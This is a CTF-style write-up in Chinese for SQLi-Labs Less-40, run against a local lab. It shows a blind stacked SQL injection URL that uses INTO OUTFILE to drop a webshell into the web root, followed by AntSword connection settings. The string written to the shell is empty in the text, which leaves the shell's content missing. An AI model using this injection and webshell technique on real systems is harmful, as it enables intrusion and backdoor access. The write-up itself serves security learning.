【SQLi-Labs】Less-40 盲堆叠注入与 WebShell Writeup

操作者：何芊宏 | 操作日期：2026.10.28 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 堆叠注入, 盲注, WebShell

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-40 (GET - Stacked Query Injection - Blind based - String)
  • 提示：基于括号的单引号闭合（')），支持堆叠执行，且无报错回显。

2. 核心原理与前置分析

本关卡是 Less-39 的变种。后端依然使用 mysqli_multi_query() 支持堆叠注入，但上下文闭合方式变为 id=('$id')，且代码屏蔽了 mysql_error()，属于彻底的无回显盲环境。

在这种盲环境下，尝试用 INSERT 验证副作用意义不大（因为看不到回显），最高效的方式是直接利用 INTO OUTFILE 盲写 WebShell，并通过本地文件系统确认是否成功。

3. 操作步骤与解析

第一步：盲写 WebShell

输入 URL：?id=1'); select '' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-40/shell.php'-- -

解释：使用 1') 闭合原语句，追加分号执行 INTO OUTFILE。由于页面无报错且只回显默认数据，执行后页面上看不出任何变化，这属于“盲执行”。

第二步：本地确认与蚁剑连接

打开本地物理目录 D:\phpstudy_pro\WWW\sqli-labs-master\Less-40\，确认生成了 shell.php。

AntSword 的具体连接配置操作步骤与 Less-38 完全一致，此处不再重复赘述。修改以下参数：

  • URL 地址：http://localhost/sqli-labs-master/Less-40/shell.php
  • 连接密码：cmd

4. 踩坑记录与复盘

  • 盲执行的心态：在盲堆叠注入中，页面的平静不代表攻击失败。只要闭合符和 SQL 语法正确，恶意语句已经落地。必须跳出页面回显的依赖，去服务器底层（物理文件系统）寻找战果。
  • 闭合符的敏锐度：从 L38 的单引号、L39 的无引号，到本关的 ')，闭合符的变化是决定注入能否成功的唯一钥匙。

5. 知识点总结

  • 盲堆叠注入：在无回显环境下，直接利用堆叠漏洞执行高危操作（写马、插后门）。
  • INTO OUTFILE 的实际应用：作为从 Web 权限提升到系统级权限（文件控制）的桥梁。
